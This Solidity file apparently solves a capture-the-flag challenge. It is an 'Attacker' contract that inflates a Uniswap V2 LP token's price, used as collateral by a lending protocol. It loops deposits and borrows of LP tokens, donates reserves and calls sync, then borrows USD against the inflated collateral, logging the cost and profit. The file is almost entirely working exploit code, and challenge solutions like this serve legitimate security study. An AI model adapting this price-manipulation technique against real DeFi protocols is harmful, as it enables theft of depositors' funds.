// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import {ERC20} from "./ERC20.sol";
import {IUniswapV2Pair} from "./IUniswapV2.sol";
import {LendingProtocol} from "./LendingProtocol.sol";
import {SqrtMath} from "./SqrtMath.sol";

/// @title Attacker
/// @author Christoph Michel <cmichel.io>
contract Attacker {
    IUniswapV2Pair public immutable pair; // token0 <> token1 uniswapv2 pair
    ERC20 public immutable ctf; // token0
    ERC20 public immutable usd; // token1
    LendingProtocol public immutable lending;

    AttackerChild child;

    constructor(ERC20 _ctf, ERC20 _usd, IUniswapV2Pair _pair, LendingProtocol _lending) {
        ctf = _ctf;
        usd = _usd;
        pair = _pair;
        lending = _lending;

        child = new AttackerChild(_usd, _pair, _lending);

        _ctf.approve(address(_lending), type(uint256).max);
        _usd.approve(address(_lending), type(uint256).max);
    }

    function attack() external {
        uint256 usdLiqAmount = 100e18;

        ctf.transfer(address(pair), usdLiqAmount / 1000);
        usd.transfer(address(pair), usdLiqAmount);
        pair.mint(address(this));

        uint256 pairBalance = pair.balanceOf(address(this));

        uint256 count = 48;

        lending.deposit(address(this), address(ctf), count * usdLiqAmount / 1000);
        lending.deposit(address(this), address(usd), count * usdLiqAmount);

        uint256 depositValue = 2 * count * usdLiqAmount;
        console.log("Deposit1 value:   ", depositValue);

        pair.transfer(address(child), pairBalance);
        child.deposit(pairBalance);
        for (uint256 i; i < count; ++i) {
            lending.borrow(address(pair), pairBalance);
            pair.transfer(address(child), pairBalance);
            child.deposit(pairBalance);
        }
        uint256 lpDeposited = (count + 1) * pairBalance;
        uint256 borrowValueBefore = (lpDeposited * _getPairPrice()) >> 112;

        console.log("Deposit2 value:   ", borrowValueBefore);

        console.log("Total supply:     ", pair.totalSupply());
        console.log("Deposited:        ", lpDeposited);

        uint256 ctfLeft = ctf.balanceOf(address(this));
        uint256 usdLeft = usd.balanceOf(address(this));
        ctf.transfer(address(pair), ctfLeft);
        usd.transfer(address(pair), usdLeft);

        uint256 manipulationCost = 1000 * ctfLeft + usdLeft;
        console.log("Manipulation Cost:", manipulationCost);

        pair.sync();

        uint256 borrowValue = (lpDeposited * _getPairPrice()) >> 112;
        uint256 usdAvailable = usd.balanceOf(address(lending));
        console.log("Borrowable:       ", borrowValue);
        console.log("Balance   :       ", usdAvailable);

        console.log("Price change:     ", borrowValue * 100 / depositValue);

        console.log("Profit:           ", borrowValue - depositValue - manipulationCost);

        child.borrow(min(borrowValue, usdAvailable));
    }

    function _getPairPrice() internal view returns (uint256) {
        uint256 totalSupply = IUniswapV2Pair(pair).totalSupply();
        (uint256 r0, uint256 r1,) = IUniswapV2Pair(pair).getReserves();
        uint256 sqrtK = (SqrtMath.sqrt(r0 * r1) << 112) / totalSupply; // in 2**112
        uint256 priceCtf = 1_000 << 112; // in 2**112

        // fair lp price = 2 * sqrtK * sqrt(priceCtf * priceUsd) = 2 * sqrtK * sqrt(priceCtf)
        // sqrtK is in 2**112 and sqrt(priceCtf) is in 2**56. divide by 2**56 to return result in 2**112
        return (sqrtK * 2 * SqrtMath.sqrt(priceCtf)) / 2 ** 56;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

contract AttackerChild {
    ERC20 usd;
    IUniswapV2Pair public immutable pair; // token0 <> token1 uniswapv2 pair
    LendingProtocol public immutable lending;

    constructor(ERC20 _usd, IUniswapV2Pair _pair, LendingProtocol _lending) {
        usd = _usd;
        pair = _pair;
        lending = _lending;

        _pair.approve(address(_lending), type(uint256).max);
    }

    function deposit(uint256 _amount) external {
        lending.deposit(address(this), address(pair), _amount);
    }

    function borrow(uint256 _amount) external {
        lending.borrow(address(usd), _amount);
    }
}
